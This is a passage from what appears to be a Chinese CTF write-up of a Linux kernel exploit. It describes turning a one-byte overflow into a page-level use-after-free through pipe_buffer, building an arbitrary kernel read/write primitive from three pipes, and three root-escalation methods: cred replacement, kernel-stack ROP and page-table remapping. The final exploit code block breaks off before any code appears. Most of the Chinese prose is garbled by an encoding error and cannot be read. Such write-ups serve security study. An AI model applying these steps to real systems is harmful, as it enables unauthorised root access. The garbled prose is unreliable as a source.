æ•´é™¤ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿ<strong>é€šè¿‡ partial overwrite ä½¿å¾—ä¸¤ä¸ªç®¡é“æŒ‡å‘åŒä¸€å¼ é¡µé¢ï¼Œå¹¶é‡Šæ”¾æ‰å…¶ä¸­ä¸€ä¸ª</strong>ï¼Œæˆ‘ä»¬ä¾¿æ„é€ å‡ºäº†<strong>é¡µçº§çš„ UAF</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p><p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p><p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p><p>åŒæ—¶<strong>ç®¡é“çš„ç‰¹æ€§è¿˜èƒ½è®©æˆ‘ä»¬åœ¨ UAF é¡µé¢ä¸Šä»»æ„è¯»å†™</strong>ï¼Œè¿™çœŸæ˜¯å†ç¾å¦™ä¸è¿‡äº†ï¼šï¼‰</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªå°é—®é¢˜ï¼Œ<code>pipe_buffer</code> æ¥è‡ªäº <code>kmalloc-cg-1k</code> ï¼Œå…¶ä¼šè¯·æ±‚ order-2 çš„é¡µé¢ï¼Œè€Œé¢˜ç›®æ¨¡å—çš„å¯¹è±¡å¤§å°ä¸º 2kï¼Œå…¶ä¼šè¯·æ±‚ order-3 çš„é¡µé¢ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è¿›è¡Œä¸åŒ order é—´çš„å †é£æ°´çš„è¯ï¼Œåˆ™åˆ©ç”¨æˆåŠŸç‡ä¼šå¤§æ‰“æŠ˜æ‰£ :ï¼ˆ</p><p>ä½† pipe å¯ä»¥è¢«æŒ–æ˜çš„æ½œåŠ›è¿œæ¯”æˆ‘ä»¬æƒ³è±¡ä¸­å¤§å¾—å¤šï¼šï¼‰ç°åœ¨è®©æˆ‘ä»¬é‡æ–°å®¡è§† <code>pipe_buffer</code> çš„åˆ†é…è¿‡ç¨‹ï¼Œå…¶å®é™…ä¸Šæ˜¯å•æ¬¡åˆ†é… <code>pipe_bufs</code> ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åˆ° <code>pipe_buffer</code> <strong>ä¸æ˜¯ä¸€ä¸ªå¸¸é‡è€Œæ˜¯ä¸€ä¸ªå˜é‡</strong>ï¼Œé‚£ä¹ˆ<strong>æˆ‘ä»¬èƒ½å¦æœ‰æ–¹æ³•ä¿®æ”¹ pipe_buffer çš„æ•°é‡ï¼Ÿ</strong>ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œpipe ç³»ç»Ÿè°ƒç”¨éå¸¸è´´å¿ƒåœ°ä¸ºæˆ‘ä»¬æä¾›äº† <code>F_SETPIPE_SZ</code> <strong>è®©æˆ‘ä»¬å¯ä»¥é‡æ–°åˆ†é… pipe_buffer å¹¶æŒ‡å®šå…¶æ•°é‡</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>pipe = get_pipe_info(file, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>ret = pipe_resize_ring(pipe, nr_slots);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡ fcntl() é‡æ–°åˆ†é…å•ä¸ª pipe çš„ pipe_buffer æ•°é‡ï¼Œ</strong>ï¼š</p><ul><li>å¯¹äºæ¯ä¸ª pipe æˆ‘ä»¬<strong>æŒ‡å®šåˆ†é… 64 ä¸ª pipe_bufferï¼Œä»è€Œä½¿å…¶å‘ kmalloc-cg-2k è¯·æ±‚å¯¹è±¡ï¼Œè€Œè¿™å°†æœ€ç»ˆå‘ buddy system è¯·æ±‚ order-3 çš„é¡µé¢</strong></li></ul><p>ç”±æ­¤ï¼Œæˆ‘ä»¬ä¾¿æˆåŠŸä½¿å¾— <code>pipe_buffer</code> ä¸é¢˜ç›®æ¨¡å—çš„å¯¹è±¡<strong>å¤„åœ¨åŒä¸€ order çš„å†…å­˜é¡µä¸Š</strong>ï¼Œä»è€Œæé«˜ cross-cache overflow çš„æˆåŠŸç‡</p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº page ç»“æ„ä½“çš„å¤§å°ä¸º 0x40ï¼Œå…¶å¯ä»¥è¢« 0x100 æ•´é™¤ï¼Œå› æ­¤è‹¥æˆ‘ä»¬æ‰€æº¢å‡ºçš„ç›®æ ‡ page çš„åœ°å€æœ€åä¸€ä¸ªå­—èŠ‚åˆšå¥½ä¸º <code>\x00</code>ï¼Œ  <em>é‚£å°±ç­‰æ•ˆäºæ²¡æœ‰æº¢å‡º</em>  ï¼Œå› æ­¤å®é™…ä¸Šåˆ©ç”¨æˆåŠŸç‡ä»…ä¸º <code>75% </code> ï¼ˆæ‚²ï¼‰</p><h2 id="Step-III-æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™"><a href="#Step-III-æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™" class="headerlink" title="Step.III - æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™"></a>Step.III - æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™</h2><p>æœ‰äº† page-level UAFï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è€ƒè™‘å‘è¿™å¼ é¡µé¢åˆ†é…ä»€ä¹ˆç»“æ„ä½“ä½œä¸ºä¸‹ä¸€é˜¶æ®µçš„ victim object</p><p>ç”±äºç®¡é“æœ¬èº«ä¾¿æä¾›ç»™æˆ‘ä»¬è¯»å†™çš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬åˆèƒ½å¤Ÿè°ƒæ•´ <code>pipe_buffer</code> çš„å¤§å°å¹¶é‡æ–°åˆ†é…ç»“æ„ä½“ï¼Œé‚£ä¹ˆå†æ¬¡é€‰æ‹© <code>pipe_buffer</code> ä½œä¸º victim object ä¾¿æ˜¯å†è‡ªç„¶ä¸è¿‡çš„äº‹æƒ…ï¼šï¼‰</p><p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ç®¡é“<strong>è¯»å– pipe_buffer å†…å®¹ï¼Œä»è€Œæ³„éœ²å‡º pageã€pipe_buf_operations ç­‰æœ‰ç”¨çš„æ•°æ®</strong>ï¼ˆå¯ä»¥åœ¨é‡åˆ†é…å‰é¢„å…ˆå‘ç®¡é“ä¸­å†™å…¥ä¸€å®šé•¿åº¦çš„å†…å®¹ï¼Œä»è€Œå®ç°æ•°æ®è¯»å–ï¼‰ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ç®¡é“ç›´æ¥æ”¹å†™ <code>pipe_buffer</code> ï¼Œå› æ­¤å°†æ¼æ´è½¬åŒ–ä¸º dirty pipe æˆ–è®¸ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„åŠæ³•ï¼ˆè¿™ä¹Ÿæ˜¯æœ¬æ¬¡æ¯”èµ›ä¸­ NU1L æˆ˜é˜Ÿçš„è§£æ³•ï¼‰</p><p>ä½†æ˜¯ pipe çš„å¼ºå¤§ä¹‹å¤„è¿œä¸æ­¢è¿™äº›ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥å¯¹ UAF é¡µé¢ä¸Šçš„ <code>pipe_buffer</code> è¿›è¡Œè¯»å†™ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ç»§ç»­æ„é€ å‡ºç¬¬äºŒçº§çš„ page-level UAF</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p><p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢ï¼Ÿåœ¨ç¬¬ä¸€æ¬¡ UAF æ—¶æˆ‘ä»¬è·å–åˆ°äº† page ç»“æ„ä½“çš„åœ°å€ï¼Œè€Œ page ç»“æ„ä½“çš„å¤§å°å›ºå®šä¸º 0x40ï¼Œ<strong>ä¸”ä¸ç‰©ç†å†…å­˜é¡µä¸€ä¸€å¯¹åº”</strong>ï¼Œè¯•æƒ³è‹¥æ˜¯æˆ‘ä»¬å¯ä»¥ä¸æ–­åœ°ä¿®æ”¹ä¸€ä¸ª pipe çš„ page æŒ‡é’ˆï¼Œ<strong>åˆ™æˆ‘ä»¬ä¾¿èƒ½å®Œæˆå¯¹æ•´ä¸ªå†…å­˜ç©ºé—´çš„ä»»æ„è¯»å†™</strong>ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬è¦å®Œæˆè¿™æ ·çš„ä¸€ä¸ªåˆ©ç”¨ç³»ç»Ÿçš„æ„é€ </p><p>å†æ¬¡é‡æ–°åˆ†é… <code>pipe_buffer</code> ç»“æ„ä½“åˆ°ç¬¬äºŒçº§ page-level UAF é¡µé¢ä¸Šï¼Œ<strong>ç”±äºè¿™å¼ ç‰©ç†é¡µé¢å¯¹åº”çš„ page ç»“æ„ä½“çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è®©è¿™å¼ é¡µé¢ä¸Šçš„ pipe_buffer çš„ page æŒ‡é’ˆæŒ‡å‘è‡ªèº«ï¼Œä»è€Œç›´æ¥å®Œæˆå¯¹è‡ªèº«çš„ä¿®æ”¹</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹ <code>pipe_buffer.offset</code> ä¸ <code>pipe_buffer.len</code> æ¥ç§»åŠ¨ pipe çš„è¯»å†™èµ·å§‹ä½ç½®ï¼Œä»è€Œå®ç°æ— é™å¾ªç¯çš„è¯»å†™ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå˜é‡ä¼šåœ¨å®Œæˆè¯»å†™æ“ä½œåé‡æ–°è¢«èµ‹å€¼ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<strong>ä¸‰ä¸ªç®¡é“</strong>ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªç®¡é“ç”¨ä»¥è¿›è¡Œå†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹å…¶ page æŒ‡é’ˆå®Œæˆ ï¼šï¼‰</li><li>ç¬¬äºŒä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“ï¼Œä½¿å…¶å†™å…¥çš„èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“</li><li>ç¬¬ä¸‰ä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸€ä¸ªä¸ç¬¬äºŒä¸ªç®¡é“ï¼Œä½¿å¾—ç¬¬ä¸€ä¸ªç®¡é“çš„ pipe æŒ‡é’ˆæŒ‡å‘æŒ‡å®šä½ç½®ã€ç¬¬äºŒä¸ªç®¡é“çš„å†™å…¥èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸‰ä¸ªç®¡é“</li></ul><p>é€šè¿‡è¿™ä¸‰ä¸ªç®¡é“ä¹‹é—´äº’ç›¸å¾ªç¯ä¿®æ”¹ï¼Œæˆ‘ä»¬ä¾¿<strong>å®ç°äº†ä¸€ä¸ªå¯ä»¥åœ¨å†…å­˜ç©ºé—´ä¸­è¿›è¡Œè¿‘ä¹æ— é™åˆ¶çš„ä»»æ„è¯»å†™ç³»ç»Ÿ</strong> ï¼šï¼‰</p><h2 id="Step-IV-ææƒ"><a href="#Step-IV-ææƒ" class="headerlink" title="Step.IV - ææƒ"></a>Step.IV - ææƒ</h2><p>æœ‰äº†å†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œææƒä¾¿æ˜¯éå¸¸ç®€ä¾¿çš„ä¸€ä»¶äº‹æƒ…äº†ï¼Œè¿™é‡Œç¬”è€…ç»™å‡ºä¸‰ç§ææƒæ–¹æ³•ï¼šï¼‰</p><h3 id="æ–¹æ³•ä¸€ã€ä¿®æ”¹å½“å‰è¿›ç¨‹çš„-task-struct-çš„-cred-ä¸º-init-cred"><a href="#æ–¹æ³•ä¸€ã€ä¿®æ”¹å½“å‰è¿›ç¨‹çš„-task-struct-çš„-cred-ä¸º-init-cred" class="headerlink" title="æ–¹æ³•ä¸€ã€ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ task_struct çš„ cred ä¸º init_cred"></a>æ–¹æ³•ä¸€ã€ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ task_struct çš„ cred ä¸º init_cred</h3><p><code>init_cred</code> ä¸ºæœ‰ç€ root æƒé™çš„ credï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å½“å‰è¿›ç¨‹çš„ cred ä¿®æ”¹ä¸ºè¯¥ cred ä»¥å®Œæˆææƒï¼Œè¿™é‡Œiwomå¯ä»¥é€šè¿‡ <code>prctl(PR_SET_NAME, &quot;arttnba3pwnn&quot;);</code> ä¿®æ”¹ <code>task_struct.comm</code> ï¼Œä»è€Œæ–¹ä¾¿æœç´¢å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> åœ¨å†…å­˜ç©ºé—´ä¸­çš„ä½ç½®ï¼šï¼‰</p><p>ä¸è¿‡ <code>init_cred</code> çš„ç¬¦å·æœ‰çš„æ—¶å€™æ˜¯ä¸åœ¨ <code>/proc/kallsyms</code> ä¸­å¯¼å‡ºçš„ï¼Œæˆ‘ä»¬åœ¨è°ƒè¯•æ—¶æœªå¿…èƒ½å¤Ÿè·å¾—å…¶åœ°å€ï¼Œå› æ­¤è¿™é‡Œç¬”è€…é€‰æ‹©é€šè¿‡è§£æ <code>task_struct</code> çš„æ–¹å¼å‘ä¸Šä¸€ç›´æ‰¾åˆ° <code>init</code> è¿›ç¨‹ï¼ˆæ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼‰çš„ <code>task_struct</code> ï¼Œä»è€Œè·å¾— <code>init_cred</code> çš„åœ°å€ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/jO5GwFnmSxkr3fg.png" alt="image.png"></p><h3 id="æ–¹æ³•äºŒã€å†…æ ¸é¡µè¡¨è§£æè·å–å†…æ ¸æ ˆç‰©ç†åœ°å€ï¼Œåˆ©ç”¨ç›´æ¥æ˜ å°„åŒºè¦†å†™å†…æ ¸æ ˆå®Œæˆ-ROP"><a href="#æ–¹æ³•äºŒã€å†…æ ¸é¡µè¡¨è§£æè·å–å†…æ ¸æ ˆç‰©ç†åœ°å€ï¼Œåˆ©ç”¨ç›´æ¥æ˜ å°„åŒºè¦†å†™å†…æ ¸æ ˆå®Œæˆ-ROP" class="headerlink" title="æ–¹æ³•äºŒã€å†…æ ¸é¡µè¡¨è§£æè·å–å†…æ ¸æ ˆç‰©ç†åœ°å€ï¼Œåˆ©ç”¨ç›´æ¥æ˜ å°„åŒºè¦†å†™å†…æ ¸æ ˆå®Œæˆ ROP"></a>æ–¹æ³•äºŒã€å†…æ ¸é¡µè¡¨è§£æè·å–å†…æ ¸æ ˆç‰©ç†åœ°å€ï¼Œåˆ©ç”¨ç›´æ¥æ˜ å°„åŒºè¦†å†™å†…æ ¸æ ˆå®Œæˆ ROP</h3><p><strong>å¼€å¯äº† CFI å¹¶ä¸ä»£è¡¨æˆ‘ä»¬ä¾¿ä¸èƒ½å¤Ÿåœ¨å†…æ ¸ç©ºé—´ä¸­è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œäº†ï¼Œä½œä¸ºä¸€åé»‘å®¢æ²¡æœ‰ä»€ä¹ˆæ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€å› æ­¤æˆ‘ä»¬ä»ç„¶è¦è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œï¼šï¼‰</strong>ï¼ˆâ†æœ‰ç‚¹ä¸­äºŒçš„ä¸€ä¸ªäºº</p><p>ç”±äº page ç»“æ„ä½“æ•°ç»„ä¸ç‰©ç†å†…å­˜é¡µä¸€ä¸€å¯¹åº”çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°åœ¨ç‰©ç†åœ°å€ä¸ page ç»“æ„ä½“åœ°å€é—´è¿›è¡Œè½¬æ¢ï¼Œè€Œåœ¨é¡µè¡¨å½“ä¸­å­˜æ”¾çš„æ˜¯ç‰©ç†åœ°å€ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡è§£æå½“å‰è¿›ç¨‹çš„é¡µè¡¨æ¥è·å–åˆ°å†…æ ¸æ ˆçš„ç‰©ç†åœ°å€ï¼Œä»è€Œè·å–åˆ°å†…æ ¸æ ˆå¯¹åº”çš„ page</strong>ï¼Œä¹‹åæˆ‘ä»¬å¯ä»¥<strong>ç›´æ¥å‘å†…æ ¸æ ˆä¸Šå†™ ROP chain æ¥å®Œæˆä»»æ„ä»£ç æ‰§è¡Œ</strong></p><p>é¡µè¡¨çš„åœ°å€å¯ä»¥é€šè¿‡ <code>mm_struct</code> è·å–ï¼Œ <code>mm_struct</code> åœ°å€å¯ä»¥é€šè¿‡ <code>task_struct</code> è·å–ï¼Œå†…æ ¸æ ˆåœ°å€åŒæ ·å¯ä»¥é€šè¿‡ <code>task_struct</code> è·å–ï¼Œé‚£ä¹ˆè¿™ä¸€åˆ‡å…¶å®æ˜¯æ°´åˆ°æ¸ æˆçš„äº‹æƒ…ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/sRVcEax3wHApBW2.png" alt="image.png"></p><blockquote><p>ä½†è¿™ç§æ–¹æ³•æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œæˆ‘ä»¬ä¼š<strong>æœ‰ä¸€å®šæ¦‚ç‡æ²¡æ³•ç›´æ¥å†™åˆ°å½“å‰è¿›ç¨‹çš„å†…æ ¸æ ˆä¸Š</strong>ï¼ˆä¹Ÿä¸çŸ¥é“å†™å“ªå»äº†ï¼‰ï¼Œä»è€Œå¯¼è‡´ ROP å¤±è´¥ï¼Œ<strong>åŸå› ä¸æ˜</strong></p><blockquote><p>ç¬”è€…æš‚æ—¶æ²¡æœ‰å‘ç°æ•´ä¸ªè¿‡ç¨‹çš„åŸç†å­˜åœ¨ç¼ºé™·çš„åœ°æ–¹ï¼Œç”šè‡³å°è¯•å¤šæ¬¡é‡æ–°è§£æé¡µè¡¨ï¼ˆå¾—åˆ°çš„å†…æ ¸æ ˆåœ°å€ä¸å˜ï¼‰ç„¶åå†™å…¥æ•°æ®åä»æ—§æ— äº‹å‘ç”Ÿï¼Œä¹Ÿä¸çŸ¥é“ç©¶ç«Ÿæ˜¯å“ªå‡ºäº†é—®é¢˜ ï¼š(</p></blockquote></blockquote><h3 id="æ–¹æ³•ä¸‰ã€å†…æ ¸é¡µè¡¨è§£æè·å–ä»£ç æ®µç‰©ç†åœ°å€ï¼Œæ”¹å†™å†…æ ¸é¡µè¡¨å»ºç«‹æ–°æ˜ å°„å®ç°-USMA"><a href="#æ–¹æ³•ä¸‰ã€å†…æ ¸é¡µè¡¨è§£æè·å–ä»£ç æ®µç‰©ç†åœ°å€ï¼Œæ”¹å†™å†…æ ¸é¡µè¡¨å»ºç«‹æ–°æ˜ å°„å®ç°-USMA" class="headerlink" title="æ–¹æ³•ä¸‰ã€å†…æ ¸é¡µè¡¨è§£æè·å–ä»£ç æ®µç‰©ç†åœ°å€ï¼Œæ”¹å†™å†…æ ¸é¡µè¡¨å»ºç«‹æ–°æ˜ å°„å®ç° USMA"></a>æ–¹æ³•ä¸‰ã€å†…æ ¸é¡µè¡¨è§£æè·å–ä»£ç æ®µç‰©ç†åœ°å€ï¼Œæ”¹å†™å†…æ ¸é¡µè¡¨å»ºç«‹æ–°æ˜ å°„å®ç° USMA</h3><p>æ—¢ç„¶æˆ‘ä»¬èƒ½å¤Ÿè¿›è¡Œå†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œ<strong>ç›´æ¥æ”¹å†™å†…æ ¸ä»£ç æ®µä¹Ÿæ˜¯ä¸€ä¸ªå®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„å¥½åŠæ³•</strong>ï¼Œä½†æ˜¯ç›´æ¥æ˜ å°„åŒºå¯¹åº”çš„å†…æ ¸ä»£ç æ®µåŒºåŸŸ<strong>æ²¡æœ‰å¯å†™å…¥æƒé™ï¼Œç›´æ¥å†™ä¼šå¯¼è‡´ kernel panic :ï¼ˆ</strong></p><p>ä½†æ˜¯æ”¹å†™å†…æ ¸ä»£ç æ®µæœ¬è´¨ä¸Šä¾¿æ˜¯å‘å¯¹åº”çš„ç‰©ç†é¡µå†™å…¥æ•°æ®ï¼Œè€Œæˆ‘ä»¬åˆèƒ½å¤Ÿè¯»å†™è¿›ç¨‹é¡µè¡¨ï¼Œ<strong>æˆ‘ä»¬ç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´å»ºç«‹ä¸€ä¸ªåˆ°å†…æ ¸ä»£ç æ®µå¯¹åº”ç‰©ç†å†…å­˜çš„æ˜ å°„å°±èƒ½æ”¹å†™å†…æ ¸ä»£ç æ®µäº†ï¼šï¼‰</strong></p><p>æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ <code>mmap()</code> éšä¾¿æ˜ å°„ä¸€å—å†…å­˜ï¼Œä¹‹åæ”¹å†™ <code>mmap()</code> çš„è™šæ‹Ÿåœ°å€åœ¨é¡µè¡¨ä¸­å¯¹åº”çš„ç‰©ç†åœ°å€å³å¯ï¼Œè¿™ç§æ–¹æ³•æœ¬è´¨ä¸Šå…¶å®å°±æ˜¯ <a href="https://vul.360.net/archives/391">ç”¨æˆ·æ€æ˜ å°„æ”»å‡»</a>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/U3BEbFTsZiy48NQ.png" alt="image.png"></p><h2 id="Final-Exploitation"><a href="#Final-Exploitation" class="headerlink" title="Final Exploitation"></a>Final Exploitation</h2><p>æœ€ç»ˆçš„å®Œæ•´ exp å¦‚ä¸‹ï¼Œ<strong>åŒæ—¶åŒ…å«ç¬”è€…æ‰€ç»™å‡ºçš„ä¸‰ç§ææƒæ‰‹æ®µçš„ä»£ç </strong>ï¼š</p><blockquote><p>ç”±äº page ç»“æ„ä½“åœ°å€å¯èƒ½å‡ºç°æœ«å­—èŠ‚ä¸º <code>\x00</code> çš„æƒ…å†µï¼Œæ•…æˆåŠŸå‡ ç‡ä»…æœ‰ 75% ï¼ˆæ‚²ï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 